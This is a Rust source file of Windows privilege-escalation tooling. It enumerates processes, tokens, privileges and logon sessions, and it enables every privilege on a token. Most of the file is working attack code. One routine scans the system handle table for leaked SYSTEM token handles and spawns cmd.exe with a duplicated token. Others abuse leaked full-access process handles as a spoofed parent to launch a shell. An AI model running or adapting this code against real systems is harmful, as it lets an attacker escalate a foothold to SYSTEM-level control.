use std::collections::HashMap;
use ntapi::ntobapi::NtQueryObject;
use ntapi::ntobapi::OBJECT_INFORMATION_CLASS;
use ntapi::ntobapi::OBJECT_TYPE_INFORMATION;
use ntapi::ntpsapi::PROCESSINFOCLASS;
use ntapi::ntpsapi::PROCESS_BASIC_INFORMATION;
use ntapi::ntseapi::NtCreateToken;
use winapi::ctypes::*;
use winapi::shared::ntdef::NT_SUCCESS;
use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
use winapi::shared::ntdef::OBJ_CASE_INSENSITIVE;
use winapi::shared::ntdef::UNICODE_STRING;
use winapi::shared::ntstatus::STATUS_INFO_LENGTH_MISMATCH;
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::shared::sddl::*;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::CREATE_NEW;
use winapi::um::handleapi::CloseHandle;
use winapi::um::handleapi::DuplicateHandle;
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use winapi::um::lsalookup::LSA_STRING;
use winapi::um::lsalookup::LSA_UNICODE_STRING;
use winapi::um::memoryapi::ReadProcessMemory;
use winapi::um::memoryapi::WriteProcessMemory;
use winapi::um::ntlsa::SECURITY_LOGON_SESSION_DATA;
use winapi::um::ntsecapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::securitybaseapi::*;
use winapi::um::winbase::*;
use winapi::um::winnt::*;
use winapi::um::winnt::{TOKEN_INFORMATION_CLASS, TOKEN_USER};
use winapi::um::ntlsa::*;
use ntapi::ntexapi::*;
use winapi::um::synchapi::*;
use winapi::um::tlhelp32::*;
use winapi::shared::winerror::*;
use itertools::Itertools;
use winapi::um::memoryapi::*;





pub fn getprocesses() -> Result<HashMap<String,usize>,String>{

    unsafe{

        let mut allprocs:HashMap<String,usize> = HashMap::new();

        let mut bytesneeded = 0u32;

        let mut ntstatus = 0i32;

        let mut buffer = loop {

            let mut buffer = vec![0u8;bytesneeded as usize];

            ntstatus = NtQuerySystemInformation(5,

                buffer.as_mut_ptr() as *mut c_void,

                bytesneeded,

                &mut bytesneeded);



            if NT_SUCCESS(ntstatus){

                break buffer;

            }



        };



        let mut nextbase = buffer.as_mut_ptr();

        loop{

           

            let procinfo = *(nextbase as *mut SYSTEM_PROCESS_INFORMATION);

           

            allprocs.insert(unicodetostring(&procinfo.ImageName, GetCurrentProcess())

            .trim_end_matches("\0").to_string(), procinfo.UniqueProcessId as usize);

            let nextoffset = std::ptr::read(nextbase as *const u32);

            if nextoffset == 0{

                break;

            }

            nextbase = (nextbase as usize+ nextoffset as usize) as *mut u8;

           

        }



        return Ok(allprocs);

       

    }

}





pub fn getprocessnamefromid(pid: usize) -> Result<String,String>{

    unsafe{

        let res = getprocesses();

        if res.is_err(){

            return Err(format!("process not found"));

        }

        if res.is_ok(){

            for (k,v) in res.unwrap(){

                if v==pid{

                    return Ok(format!("{}",k));

                }

            }

        }



        return Err(format!("process not found"));

    }

}





pub fn gettokenuserinfo(tokenhandle: *mut c_void)

-> Result<String,String> {

    unsafe {

        let mut bytesneeded = 0;

        let res = GetTokenInformation(tokenhandle, 1, std::ptr::null_mut(), 0, &mut bytesneeded);



        let mut buffer: Vec<u8> = vec![0; bytesneeded as usize];

        let res = GetTokenInformation(

            tokenhandle,

            1,

            buffer.as_mut_ptr() as *mut c_void,

            buffer.len() as u32,

            &mut bytesneeded,

        );

        if res == 0 {

            return Err(format!("GetTokenInformation failed: {}", GetLastError()));

           

        }



        let tokenuser = *(buffer.as_mut_ptr() as *mut TOKEN_USER) as TOKEN_USER;

        let mut sidstringpointer = 0 as *mut u16;

        let res = ConvertSidToStringSidW(tokenuser.User.Sid, &mut sidstringpointer);



        if res == 0 {

            return Err(format!("Convertsidtostringsidw failed: {}", GetLastError()));

           

        }



        let sid =

            readunicodestringfrommemory(GetCurrentProcess(), sidstringpointer as *const c_void);

       

        return Ok(format!("SID: {} \nusername: {}",sid,

        sidtousernamew(tokenuser.User.Sid)));



    }

}



pub fn gettokengroupinfo(tokenhandle: *mut c_void) {

    unsafe {

        let mut bytesneeded = 0;

        let res = GetTokenInformation(tokenhandle, 2, std::ptr::null_mut(), 0, &mut bytesneeded);



        if bytesneeded == 0 {

            println!("gettokeninformation failed: {}", GetLastError());

            return ();

        }



        let mut buffer: Vec<u8> = vec![0; bytesneeded as usize];

        let res = GetTokenInformation(

            tokenhandle,

            2,

            buffer.as_mut_ptr() as *mut c_void,

            buffer.len() as u32,

            &mut bytesneeded,

        );



        if res == 0 {

            println!("gettokeninformation failed: {}", GetLastError());

            return ();

        }



        let mut tokengroups = *(buffer.as_mut_ptr() as *mut TOKEN_GROUPS);



        for i in 0..tokengroups.GroupCount {

            let groups = *((buffer.as_ptr() as usize + (i as usize * 16)) as *const TOKEN_GROUPS);



            let groupname = sidtousernamew(groups.Groups[0].Sid);

            //println!("{}",groups.GroupCount);

            println!("{}", groupname);

        }

    }

}











pub fn gettokenprivilegeinfo(tokenhandle: *mut c_void)

    ->Result<Vec<String>,String>{

    unsafe {

       

        let mut privs:Vec<String> = Vec::new();

        let mut bytesneeded = 0;

        let res = GetTokenInformation(tokenhandle,

            3,

            std::ptr::null_mut(),

            bytesneeded, &mut bytesneeded);

        if res==0{

            //return Err(format!("gettokeninformation error: {}",GetLastError()));

        }

       

        let mut buffer = vec![0u8;bytesneeded as usize] ;

        let res = GetTokenInformation(tokenhandle,

            3,

            buffer.as_mut_ptr() as *mut c_void,

            bytesneeded, &mut bytesneeded);

        if res==0{

            return Err(format!("gettokeninformation error: {}",GetLastError()));

        }



        let privileges = *(buffer.as_mut_ptr() as *mut TOKEN_PRIVILEGES);

       

        for i in 0..privileges.PrivilegeCount{

            let mut luidoffset = buffer.as_mut_ptr() as usize + 4 + (i as usize * std::mem::size_of::<LUID_AND_ATTRIBUTES>());

           

            let privname =luidtousernamew(luidoffset as *mut LUID);

            privs.push(privname);

        }



     

        return Ok(privs);



    }   



}









pub fn gettokenownerinfo(tokenhandle: *mut c_void)

    -> Result<String, String>{

    unsafe{



        let mut privs:Vec<String> = Vec::new();

        let mut bytesneeded = 0;

        let res = GetTokenInformation(tokenhandle,

            4,

            std::ptr::null_mut(),

            bytesneeded, &mut bytesneeded);

        if res==0{

            //return Err(format!("gettokeninformation error: {}",GetLastError()));

        }

       

        let mut buffer = vec![0u8;bytesneeded as usize] ;

        let res = GetTokenInformation(tokenhandle,

            4,

            buffer.as_mut_ptr() as *mut c_void,

            bytesneeded, &mut bytesneeded);

        if res==0{

            return Err(format!("gettokeninformation error: {}",GetLastError()));

        }



        let tokenowner = *(buffer.as_mut_ptr() as *mut TOKEN_OWNER);





        let mut usernamebytesneeded = 0;

        let mut domainbytesneeded = 0;

        let res = LookupAccountSidA(std::ptr::null_mut(),

        tokenowner.Owner,

        std::ptr::null_mut(),

        &mut usernamebytesneeded,

        std::ptr::null_mut(),

        &mut domainbytesneeded,

        std::ptr::null_mut());



        let mut username = vec![0u8;usernamebytesneeded as usize];

        let mut domainname = vec![0u8; domainbytesneeded as usize];

        let mut sidnameuse = 0;

        let res = LookupAccountSidA(std::ptr::null_mut(),

        tokenowner.Owner,

        username.as_mut_ptr() as *mut i8,

        &mut usernamebytesneeded,

        domainname.as_mut_ptr() as *mut i8,

        &mut domainbytesneeded,

        &mut sidnameuse);





        if res==0{

            return Err(format!("lookupaccountsida error: {}",GetLastError()));



        }



        let usernamestring = String::from_utf8_lossy(&username).to_string();

        let domainnamestring = String::from_utf8_lossy(&domainname).to_string();



       

        return Ok(format!("{}\\{}",domainnamestring.trim_end_matches("\0")

        ,usernamestring.trim_end_matches("\0")));

    }





}





pub fn isimpersonatedtoken(tokenhandle:*mut c_void) -> bool{

    unsafe{





        let mut bytesneeded = 0;

        let res = GetTokenInformation(tokenhandle,

            8, std::ptr::null_mut(), 0, &mut bytesneeded);



        if bytesneeded == 0 {

            println!("gettokeninformation failed: {}", GetLastError());

            return false;

        }



        let mut buffer: Vec<u8> = vec![0; bytesneeded as usize];

        let res = GetTokenInformation(

            tokenhandle,

            8,

            buffer.as_mut_ptr() as *mut c_void,

            buffer.len() as u32,

            &mut bytesneeded,

        );



        if res == 0 {

            //println!("gettokeninformation failed: {}", GetLastError());

            return false;

        }



        if buffer[0]==1{

            //println!("TOKEN TYPE: Primary Token");

            return false;

        }

        else{

            //println!("TOKEN TYPE: Impersonation Token");

            return true;

        }

       



    }

}





pub fn gettokenimpersonationlevel(tokenhandle: *mut c_void){

    unsafe{



        if isimpersonatedtoken(tokenhandle) == false{

            println!("Not an impersonation token");

            return ();

        }



       

        let mut bytesneeded = 0;

        let res = GetTokenInformation(tokenhandle,

            9, std::ptr::null_mut(), 0, &mut bytesneeded);



        if bytesneeded == 0 {

            println!("gettokeninformation failed: {}", GetLastError());

            //return false;

        }



        let mut buffer: Vec<u8> = vec![0; bytesneeded as usize];

        let res = GetTokenInformation(

            tokenhandle,

            9,

            buffer.as_mut_ptr() as *mut c_void,

            buffer.len() as u32,

            &mut bytesneeded,

        );



        if res == 0 {

            println!("gettokeninformation failed: {}", GetLastError());

            //return false;

        }





        println!("{:?}",buffer);



    }

}





pub fn gettokenstatistics(tokenhandle: *mut c_void) -> TOKEN_STATISTICS{

    unsafe{



        let mut bytesneeded = 0;

        GetTokenInformation(tokenhandle,

            10, std::ptr::null_mut(), 0, &mut bytesneeded);



        if bytesneeded == 0 {

            println!("gettokeninformation failed: {}", GetLastError());

            return std::mem::zeroed::<TOKEN_STATISTICS>();

        }



        let mut buffer: Vec<u8> = vec![0; bytesneeded as usize];

        let res = GetTokenInformation(

            tokenhandle,

            10,

            buffer.as_mut_ptr() as *mut c_void,

            buffer.len() as u32,

            &mut bytesneeded,

        );



        if res == 0 {

            println!("gettokeninformation failed: {}", GetLastError());

            return std::mem::zeroed::<TOKEN_STATISTICS>();

        }



        let tokenstats = *(buffer.as_mut_ptr() as *mut TOKEN_STATISTICS);



        //println!("Token ID lowpart: {:x?}",tokenstats.TokenId.LowPart);

        //println!("Token ID highpart: {:x?}",tokenstats.TokenId.HighPart);



        //println!("Auth ID lowpart: {:x?}",tokenstats.AuthenticationId.LowPart);

        //println!("Auth ID highpart: {:x?}",tokenstats.AuthenticationId.HighPart);



        if tokenstats.TokenType==1{

            //println!("Primary Token");

        }

        else{

           // println!("Impersonation Token");



        }



        //println!("Privilege count: {}",tokenstats.PrivilegeCount);

        //println!("group count: {}",tokenstats.GroupCount);



        return tokenstats;

     

    }

}





pub fn getlogonsessions(){

    unsafe{



        let mut sessioncount = 0;

        let mut temppointer = 0 as *mut LUID;

        let res = LsaEnumerateLogonSessions(&mut sessioncount,

            &mut temppointer );

       

        if res!=STATUS_SUCCESS{

            println!("lsaenumeratelogonsessions failed: {}",res);

            return ();

        }



        println!("session count: {}",sessioncount);

       

        for i in 0..sessioncount{

            let luid = *((temppointer as usize  + (i as usize * std::mem::size_of::<LUID>())) as *mut LUID);

            let pluid = (temppointer as usize  + (i as usize * std::mem::size_of::<LUID>())) as *mut LUID;



            let mut logondata = 0 as *mut SECURITY_LOGON_SESSION_DATA;

            let res =LsaGetLogonSessionData(pluid, &mut logondata );

            if res!=STATUS_SUCCESS{

                println!("lsagetlogonsessiondata failed: {:x?}",res);

                continue;

            }



            let sessiondata = *(logondata);



            let username = lsaunicodetostring(&sessiondata.UserName, GetCurrentProcess());

            let domainname = lsaunicodetostring(&sessiondata.LogonDomain, GetCurrentProcess());

       

            println!("logon luid low part: {:x?}",luid.LowPart);

            println!("logon luid high part: {:x?}",luid.HighPart);



            println!("username: {}",username);

            println!("domainname: {}",domainname);



            println!();



        }



    }   

}





pub fn istokenelevated(tokenhandle: *mut c_void){

    unsafe{









    }

}





pub fn impersonatetoken(tokenhandle: *mut c_void){

    unsafe{



        let res = ImpersonateLoggedOnUser(tokenhandle);



        if res==0{

            println!("ImpersonateLoggedOnUser failed: {}",GetLastError());

        }



    }

}







pub fn duplicatetokenandspawn(tokenhandle: *mut c_void)

-> Result<String,String>{

    unsafe{

       

        let mut newtokenhandle = 0 as *mut c_void;

        let res = DuplicateTokenEx(tokenhandle,

            0,

            std::ptr::null_mut(),

            2,

            1, &mut newtokenhandle);

        if res==0{

            return Err(format!("DuplicateTokenEx failed: {}",GetLastError()));

        }



        let mut pi = std::mem::zeroed::<PROCESS_INFORMATION>();

        let mut si = std::mem::zeroed::<STARTUPINFOW>();

        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

       



        let res = CreateProcessWithTokenW(newtokenhandle,

            2,

           

             std::ptr::null_mut(),

             "cmd.exe\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr() as *mut u16,

             CREATE_NEW_CONSOLE,

             std::ptr::null_mut(),

             std::ptr::null_mut(),

             &mut si, &mut pi);

        if res==0{

            return Err(format!("createprocesswithtokenw failed: {}",GetLastError()));

        }







        return Ok(format!("created"));



    }

}





pub fn enableallprivileges(tokenhandle: *mut c_void){

    unsafe{





      let res = gettokenprivilegeinfo(tokenhandle);

        if res.is_err(){

            println!("getting tokenprivileges error:{}",res.err().unwrap());

            return();

        }



        let mut privs = res.unwrap();

       

        for i in 0..privs.len(){



            let mut luid = std::mem::zeroed::<LUID>();

           

            let res=  LookupPrivilegeValueA(std::ptr::null_mut(),

                    privs[i].as_mut_ptr() as *mut i8,

                    &mut luid);

       

            if res==0{

                println!("LookupPrivilegeValueA failed: {}",GetLastError());

                continue;

            }





            let mut tokenprivs = std::mem::zeroed::<TOKEN_PRIVILEGES>();

            tokenprivs.PrivilegeCount = 1;

           

            let mut luidattr = std::mem::zeroed::<LUID_AND_ATTRIBUTES>();

            luidattr.Luid = luid;

            luidattr.Attributes = SE_PRIVILEGE_ENABLED;



            tokenprivs.Privileges[0] = luidattr;



            let mut previouslen = 0;

            let res = AdjustTokenPrivileges(tokenhandle,

                0,

                &mut tokenprivs,

                std::mem::size_of_val(&tokenprivs) as u32,

                std::ptr::null_mut(),

                &mut previouslen);



            if res==0{

                println!("adjusttokenprivileges failed: {}",GetLastError());

                continue;

            }





        }





    }

}





pub fn gettokenintegritylevel(tokenhandle: *mut c_void)

-> Result<String,String>{

    unsafe{



        let mut privs:Vec<String> = Vec::new();

        let mut bytesneeded = 0;

        let res = GetTokenInformation(tokenhandle,

            25,

            std::ptr::null_mut(),

            bytesneeded, &mut bytesneeded);

        if res==0{

            //return Err(format!("gettokeninformation error: {}",GetLastError()));

        }

       

        let mut buffer = vec![0u8;bytesneeded as usize] ;

        let res = GetTokenInformation(tokenhandle,

            25,

            buffer.as_mut_ptr() as *mut c_void,

            bytesneeded, &mut bytesneeded);

        if res==0{

            return Err(format!("gettokeninformation error: {}",GetLastError()));

        }



        let tokenintegrity = *(buffer.as_mut_ptr() as *mut TOKEN_MANDATORY_LABEL);

        let level = sidtousernamew(tokenintegrity.Label.Sid);

        return Ok(level);

     





    }

}







pub fn getallprochandles() -> Result<HashMap<u32,*mut c_void>,String>{

    unsafe{



        let snaphandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 4);

        let mut prochandles:HashMap<u32,*mut c_void> = HashMap::new();



        if snaphandle .is_null(){

            return Err(format!("createtoolhelp32snapshot failed: {}", GetLastError()));

           

        }



        let mut procentry = std::mem::zeroed::<PROCESSENTRY32W>();

        procentry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

       

        Process32FirstW(snaphandle, &mut procentry);



        let mut phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, procentry.th32ProcessID);

        if !phandle.is_null(){

            prochandles.insert(procentry.th32ProcessID, phandle);

        }





        loop{



            let res = Process32NextW(snaphandle, &mut procentry);

            if res==0 || res==ERROR_NO_MORE_FILES as i32{

                break;

            }



            phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, procentry.th32ProcessID);

            if !phandle.is_null(){

                prochandles.insert(procentry.th32ProcessID, phandle);

            }



        }



        return Ok(prochandles);



    }

}







pub fn getallvulntokenhandles() {

    unsafe{



        let mut bytesneeded = 0u32;



        let mut buffer = loop{



            let mut buffer = vec![0u8;bytesneeded as usize];

            let ntstatus = NtQuerySystemInformation(16,

                buffer.as_mut_ptr() as *mut c_void,

                bytesneeded,

                &mut bytesneeded);

            if NT_SUCCESS(ntstatus){

                break buffer;

            }

   



        };





        let mut handleinfo = *(buffer.as_mut_ptr() as *mut SYSTEM_HANDLE_INFORMATION);



        for i in 0..handleinfo.NumberOfHandles{



            let mut tableentry =  *((buffer.as_mut_ptr() as usize + 8+(i as usize*std::mem::size_of::<SYSTEM_HANDLE_TABLE_ENTRY_INFO>())) as *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO);



            if tableentry.GrantedAccess != TOKEN_ALL_ACCESS{

                continue;

            }



            let prochandle = OpenProcess(PROCESS_DUP_HANDLE, 0, tableentry.UniqueProcessId as u32);

            if prochandle.is_null(){

                continue;

            }







            let mut duphandle = 0 as *mut c_void;

            let res = DuplicateHandle(prochandle,

                tableentry.HandleValue as *mut c_void,

                GetCurrentProcess(),

                &mut duphandle,

                0,

                 0, DUPLICATE_SAME_ACCESS);

            if res==0{

                CloseHandle(prochandle);

                continue;

            }



            let mut reqsize = 0;

            NtQueryObject(duphandle,

                2,

                std::ptr::null_mut(),

                reqsize, &mut reqsize);







            let mut objecttypeinfobuffer = vec![0u8;reqsize as usize];

            let ntstatus1 = NtQueryObject(duphandle,

                    2,

                    objecttypeinfobuffer.as_mut_ptr() as *mut c_void,

                    reqsize, &mut reqsize);

            if !NT_SUCCESS(ntstatus1){

                CloseHandle(prochandle);

                CloseHandle(duphandle);

                continue;

            }



            let objecttypeinfo = *(objecttypeinfobuffer.as_mut_ptr() as *mut OBJECT_TYPE_INFORMATION);

            let objecttype = unicodetostring(&objecttypeinfo.TypeName, GetCurrentProcess());

            if objecttype.trim_end_matches("\0")!="Token"{

                continue;

            }



            let res2 = gettokenuserinfo(duphandle);

            if res2.is_ok(){

                let tokenuser = res2.unwrap();

                if !tokenuser.contains("SYSTEM"){

                    continue;

                }

                println!("tokenuser: {}",tokenuser);

            }

            //println!("processname: {}",getprocessnamefromid(tableentry.UniqueProcessId as usize).unwrap());

           

            //gettokenstatistics(duphandle);

            if isimpersonatedtoken(tableentry.HandleValue as *mut c_void){

                duplicatetokenandspawn(tableentry.HandleValue as *mut c_void);

                break;

            }



            println!("objecttype: {}",objecttype);

            println!("unique processid: {}",tableentry.UniqueProcessId);

            println!("object address space: {:x?}",tableentry.Object);

            println!("handle value: {:x?}",tableentry.HandleValue);

            println!("granted access: {:x?}",tableentry.GrantedAccess);

            println!();











        }





    }

}







pub fn getallvulnprochandles() {

    unsafe{



        let mut bytesneeded = 0u32;



        let mut buffer = loop{



            let mut buffer = vec![0u8;bytesneeded as usize];

            let ntstatus = NtQuerySystemInformation(16,

                buffer.as_mut_ptr() as *mut c_void,

                bytesneeded,

                &mut bytesneeded);

            if NT_SUCCESS(ntstatus){

                break buffer;

            }

   



        };



        let handleinfo2 = *(buffer.clone().as_mut_ptr() as *mut SYSTEM_HANDLE_INFORMATION);

        let mut handlestocheck:Vec<SYSTEM_HANDLE_TABLE_ENTRY_INFO> = Vec::new();

        for i in 0..handleinfo2.NumberOfHandles{

            handlestocheck.push(

                *((buffer.as_mut_ptr() as usize + 8+(i as usize*std::mem::size_of::<SYSTEM_HANDLE_TABLE_ENTRY_INFO>())) as *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO)

            )

        }









        let mut handleinfo = *(buffer.as_mut_ptr() as *mut SYSTEM_HANDLE_INFORMATION);



        for i in 0..handleinfo.NumberOfHandles{



            let mut tableentry =  *((buffer.as_mut_ptr() as usize + 8+(i as usize*std::mem::size_of::<SYSTEM_HANDLE_TABLE_ENTRY_INFO>())) as *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO);



            if tableentry.GrantedAccess!=PROCESS_ALL_ACCESS{

                continue;

            }

            if tableentry.UniqueProcessId == GetCurrentProcessId() as u16{

                continue;

            }



            let mut prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, tableentry.UniqueProcessId as u32);

            if prochandle.is_null(){

                continue;

            }







            let mut duphandle = 0 as *mut c_void;

            let res = DuplicateHandle(prochandle,

                tableentry.HandleValue as *mut c_void,

                GetCurrentProcess(),

                &mut duphandle,

                0,

                 0, DUPLICATE_SAME_ACCESS);

            if res==0{

                CloseHandle(prochandle);

                continue;

            }



            let mut reqsize = 0;

            NtQueryObject(duphandle,

                2,

                std::ptr::null_mut(),

                reqsize, &mut reqsize);





            let mut objecttypeinfobuffer = vec![0u8;reqsize as usize];

            let ntstatus1 = NtQueryObject(duphandle,

                    2,

                    objecttypeinfobuffer.as_mut_ptr() as *mut c_void,

                    reqsize, &mut reqsize);

            if !NT_SUCCESS(ntstatus1){

                CloseHandle(prochandle);

                CloseHandle(duphandle);

                continue;

            }



            let objecttypeinfo = *(objecttypeinfobuffer.as_mut_ptr() as *mut OBJECT_TYPE_INFORMATION);

            let objecttype = unicodetostring(&objecttypeinfo.TypeName, GetCurrentProcess());

            if objecttype.trim_end_matches("\0")!="Process"{

                continue;

            }

           







            for j in 0..handlestocheck.len(){

                if handlestocheck[j].UniqueProcessId==tableentry.UniqueProcessId{

                    continue;

                }

               

                if handlestocheck[j].GrantedAccess!=PROCESS_ALL_ACCESS{

                    continue;

                }

                if handlestocheck[j].ObjectTypeIndex!=0x7{

                    continue;

                }

                if handlestocheck[j].UniqueProcessId ==4||

                handlestocheck[j].UniqueProcessId ==1232

                ||handlestocheck[j].UniqueProcessId ==16556{

                    continue

                }





                if handlestocheck[j].Object == tableentry.Object{

                    let prochandle3 =OpenProcess(PROCESS_ALL_ACCESS, 0, handlestocheck[j].UniqueProcessId as u32);

                    if prochandle3.is_null(){

                        let res2 = getprocessnamefromid(tableentry.UniqueProcessId as usize);

                        if res2.is_ok(){

                            println!("processname: {}",res2.unwrap());

                        }

                       

                        println!("objecttype: {}",objecttype);

                        println!("unique processid: {}",tableentry.UniqueProcessId);

                        println!("other processid: {}",handlestocheck[j].UniqueProcessId);

                        println!("other object space: {:x?}",handlestocheck[j].Object);

                        println!("object address space: {:x?}",tableentry.Object);

                        println!("handle value: {:x?}",tableentry.HandleValue);

                        println!("other handle value: {:x?}",handlestocheck[j].HandleValue);

                        println!("granted access: {:x?}",tableentry.GrantedAccess);

                        println!();





                       



                        let mut sizeneeded = 0;

                        InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0,&mut sizeneeded );



                        println!("sizeneeded: {}",sizeneeded);

                        let mut plist = vec![0u8;sizeneeded];

                       

                        InitializeProcThreadAttributeList(plist.as_mut_ptr() as *mut PROC_THREAD_ATTRIBUTE_LIST, 1, 0,&mut sizeneeded );

                       

                        let mut sinfo = std::mem::zeroed::<STARTUPINFOEXW>();

                        sinfo.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;

                        sinfo.lpAttributeList = plist.as_mut_ptr() as *mut PROC_THREAD_ATTRIBUTE_LIST;



                        println!("dup2handle: {:x?}",duphandle);

                        let updateres = UpdateProcThreadAttribute(sinfo.lpAttributeList,

                             0,

                             0x00020000,

                             &mut duphandle as *mut _ as *mut c_void,

                             8,

                             std::ptr::null_mut(),

                             std::ptr::null_mut());

                        println!("updateprocthreadresult: {}",res);

                         

                        let mut pinfo = std::mem::zeroed::<PROCESS_INFORMATION>();



                        let res = CreateProcessW("C:\\Windows\\System32\\cmd.exe\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr() as *mut u16,

                             std::ptr::null_mut(),

                             std::ptr::null_mut(),

                             std::ptr::null_mut(),

                             1,

                             EXTENDED_STARTUPINFO_PRESENT|CREATE_NEW_CONSOLE,

                             std::ptr::null_mut(),

                             std::ptr::null_mut(),

                             &mut sinfo.StartupInfo,

                              &mut pinfo);

                   

                        if res==0{

                            println!("createprocessw failed: {}",GetLastError());

                            CloseHandle(prochandle3);

                            CloseHandle(duphandle);

                            println!();

                            continue;

                        }

                        println!("child pid: {}",pinfo.dwProcessId);

                        CloseHandle(pinfo.hProcess);

                        CloseHandle(pinfo.hThread);

                        CloseHandle(duphandle);

                        //std::process::exit(0);

                        break;





                    }

                    CloseHandle(prochandle3);

                   

                }

CloseHandle(prochandle);

            }













           

         

           







        }





    }

}







pub fn getvulnerableprochandles() {

    unsafe{



        let mut bytesneeded = 0u32;



        let mut buffer = loop{



            let mut buffer = vec![0u8;bytesneeded as usize];

            let ntstatus = NtQuerySystemInformation(16,

                buffer.as_mut_ptr() as *mut c_void,

                bytesneeded,

                &mut bytesneeded);

            if NT_SUCCESS(ntstatus){

                break buffer;

            }

   



        };



        let handleinfo2 = *(buffer.clone().as_mut_ptr() as *mut SYSTEM_HANDLE_INFORMATION);

        let mut handlestocheck:Vec<SYSTEM_HANDLE_TABLE_ENTRY_INFO> = Vec::new();

        for i in 0..handleinfo2.NumberOfHandles{

            handlestocheck.push(

                *((buffer.as_mut_ptr() as usize + 8+(i as usize*std::mem::size_of::<SYSTEM_HANDLE_TABLE_ENTRY_INFO>())) as *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO)

            )

        }









        let mut handleinfo = *(buffer.as_mut_ptr() as *mut SYSTEM_HANDLE_INFORMATION);



        for i in 0..handleinfo.NumberOfHandles{



            let mut tableentry =  *((buffer.as_mut_ptr() as usize + 8+(i as usize*std::mem::size_of::<SYSTEM_HANDLE_TABLE_ENTRY_INFO>())) as *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO);



            if tableentry.GrantedAccess!=PROCESS_ALL_ACCESS{

                continue;

            }

            if tableentry.UniqueProcessId == GetCurrentProcessId() as u16{

                continue;

            }



            // checking if we have PROCESS_ALL_ACCESS to lowprivileged process

            let mut prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, tableentry.UniqueProcessId as u32);

            if prochandle.is_null(){

                continue;

            }







            let mut duphandle = 0 as *mut c_void;

            let res = DuplicateHandle(prochandle,

                tableentry.HandleValue as *mut c_void,

                GetCurrentProcess(),

                &mut duphandle,

                0,

                 0, DUPLICATE_SAME_ACCESS);

            if res==0{

                CloseHandle(prochandle);

                continue;

            }



            let mut reqsize = 0;

            NtQueryObject(duphandle,

                2,

                std::ptr::null_mut(),

                reqsize, &mut reqsize);





            let mut objecttypeinfobuffer = vec![0u8;reqsize as usize];

            let ntstatus1 = NtQueryObject(duphandle,

                    2,

                    objecttypeinfobuffer.as_mut_ptr() as *mut c_void,

                    reqsize, &mut reqsize);

            if !NT_SUCCESS(ntstatus1){

                CloseHandle(prochandle);

                CloseHandle(duphandle);

                continue;

            }



            let objecttypeinfo = *(objecttypeinfobuffer.as_mut_ptr() as *mut OBJECT_TYPE_INFORMATION);

            let objecttype = unicodetostring(&objecttypeinfo.TypeName, GetCurrentProcess());

            if objecttype.trim_end_matches("\0")!="Process"{

                continue;

            }

           

           

            // checking if any handles have same object address

            // as our lowpriv process

            for j in 0..handlestocheck.len(){

                if handlestocheck[j].Object!= tableentry.Object{

                    continue;

                }

                if handlestocheck[j].ObjectTypeIndex !=0x7{

                    continue;

                }

                if handlestocheck[j].GrantedAccess != PROCESS_ALL_ACCESS{

                    continue;

                }

                if handlestocheck[j].UniqueProcessId == tableentry.UniqueProcessId{

                    continue;

                }





                if handlestocheck[j].UniqueProcessId==4||

                handlestocheck[j].UniqueProcessId==1232||

                handlestocheck[j].UniqueProcessId==16556{

                    continue;

                }





                let prochandle2 =OpenProcess(PROCESS_ALL_ACCESS,0 , handlestocheck[j].UniqueProcessId as u32) ;

                if prochandle2.is_null(){

                    println!("objecttype: {}",objecttype);

                    println!("unique processid: {}",tableentry.UniqueProcessId);

                    println!("other process id: {}",handlestocheck[j].UniqueProcessId);

                    println!("object address space: {:x?}",tableentry.Object);

                    println!("other address space: {:x?}",handlestocheck[j].Object);



                    println!("handle value: {:x?}",tableentry.HandleValue);

                    println!("other handle value: {:x?}",handlestocheck[j].HandleValue);



                    println!("granted access: {:x?}",tableentry.GrantedAccess);

                    println!();





                    let mut reqsize = 0;

                    InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut reqsize);



                    let mut plist = vec![0u8;reqsize];

                    let res2 = InitializeProcThreadAttributeList(plist.as_mut_ptr() as *mut PROC_THREAD_ATTRIBUTE_LIST, 1, 0, &mut reqsize);

                    if res2==0{

                        println!("initializeprocthreadattributes failed: {}",GetLastError());

                        continue;

                    }



                    let mut sinfo = std::mem::zeroed::<STARTUPINFOEXW>();

                    sinfo.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;

                 

                    sinfo.lpAttributeList = plist.as_mut_ptr() as *mut PROC_THREAD_ATTRIBUTE_LIST;





                    let res2 = UpdateProcThreadAttribute( sinfo.lpAttributeList ,

                    0,

                    0x00020000,

                    &mut duphandle as *mut _ as *mut c_void,

                    8,

                    std::ptr::null_mut(),

                    std::ptr::null_mut());

                    if res2==0{

                        println!("updateprocthreadattr failed: {}",GetLastError());

                        continue;

                    }



                   

                    let mut pinfo = std::mem::zeroed::<PROCESS_INFORMATION>();



                    let res3= CreateProcessW(

                        "C:\\Windows\\System32\\cmd.exe\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr() as *mut u16,

                        std::ptr::null_mut(),

                        std::ptr::null_mut(),

                        std::ptr::null_mut(),

                        1,

                        EXTENDED_STARTUPINFO_PRESENT|CREATE_NEW_CONSOLE,

                        std::ptr::null_mut(),

                        std::ptr::null_mut(),

                        &mut sinfo.StartupInfo,

                        &mut pinfo);

                    if res3==0{

                        println!("createprocessw failed: {}",GetLastError());

                       

                        continue;

                    }

                    println!("child processid: {}",pinfo.dwProcessId);





                }

               



            }





                   

            CloseHandle(duphandle);



            CloseHandle(prochandle);

           

            }













           

         

           







       





    }

